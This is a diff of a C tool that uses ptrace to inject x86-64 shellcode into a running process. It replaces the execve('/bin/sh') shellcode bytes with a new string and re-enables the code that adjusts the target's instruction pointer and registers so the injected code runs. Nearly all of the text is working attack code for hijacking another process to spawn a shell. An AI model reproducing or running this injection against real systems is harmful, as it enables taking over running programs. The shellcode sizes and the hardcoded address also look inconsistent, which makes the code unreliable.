@@ -21,10 +21,10 @@
 
 #include <sys/reg.h>
 
-#define SHELLCODE_SIZE 32
+#define SHELLCODE_SIZE 24
 
 unsigned char * shellcode =
-"\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6\x48\x8d\x3d\x04\x00\x00\x00\x04\x3b\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68";
+"\x48\x31\xd2\x48\x31\xf6\x48\x8d\x3c\x25\x23\x01\x60\x00\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05";
 
 int inject_data(pid_t pid, unsigned char * src, void * dst, int len) {
   int i;
@@ -85,13 +85,13 @@ int main(int argc, char * argv[]) {
     So, I commented out the following code.
   */
 
-  // regs.rip += 2;
-  // printf("+ Setting instruction pointer to %p\n", (void * ) regs.rip);
+  regs.rip += 2;
+  printf("+ Setting instruction pointer to %p\n", (void * ) regs.rip);
 
-  // if ((ptrace(PTRACE_SETREGS, target, NULL, & regs)) < 0) {
-  //   perror("ptrace(GETREGS):");
-  //   exit(1);
-  // }
+  if ((ptrace(PTRACE_SETREGS, target, NULL, & regs)) < 0) {
+    perror("ptrace(GETREGS):");
+    exit(1);
+  }
   printf("+ Run it!\n");
 
   // return execution control back to target process and have it run
